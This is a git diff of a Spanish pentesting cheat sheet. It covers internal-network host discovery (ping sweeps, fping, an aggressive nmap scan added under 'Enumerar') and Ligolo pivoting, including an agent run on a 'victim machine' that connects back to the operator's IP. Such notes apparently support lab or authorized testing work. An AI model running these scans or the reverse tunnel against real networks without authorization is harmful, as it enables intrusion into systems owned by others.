@@ -5,17 +5,27 @@
 ```bash
 for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep  "bytes from");done
 ```
+
 - Subes fping y haces:
 ```bash
 ./fping -a -g 192.168.100.93/24 2>/dev/null 
 ```
 
 
-
 - Windows
 ```powershell
 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
 ```
+
+# Enumerar
+
+```bash
+fping -a -g 192.168.100.0/24 2>/dev/null
+
+
+nmap -sCV -iL internal2.txt --min-rate 1000 -Pn -T4 -oN internal2_ports
+```
+
 
 ## Ligolo
 
@@ -35,9 +45,9 @@ sudo ip route add segmento_a_llegar/24 dev ligolo
 ```bash
 ./proxy -selfcert
 #Tras unirte a la session
-interface_create --name lligolo
-route_add --name lligolo --route 172.16.0.0/24
-tunnel_start --tun lligolo
+interface_create --name ligolo
+route_add --name ligolo --route 172.16.0.0/24
+tunnel_start --tun ligolo
 #En la maquina victima
 ./agent -connect MIIP:11601 -ignore-cert
 
